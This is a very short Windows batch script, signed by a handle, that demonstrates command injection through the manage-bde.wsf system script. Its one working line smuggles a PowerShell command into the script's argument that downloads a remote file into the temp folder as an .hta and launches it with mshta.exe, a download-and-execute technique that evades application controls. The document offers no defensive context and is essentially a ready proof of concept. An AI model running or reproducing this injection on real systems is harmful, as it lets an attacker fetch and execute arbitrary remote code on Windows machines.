@echo coded by chakal#2820
@echo command injection in manage-bde.wsf
manage-bde.wsf " | powershell -command iwr -outf %temp%\test.hta https://www.google.com/; mshta.exe %temp%\test.hta"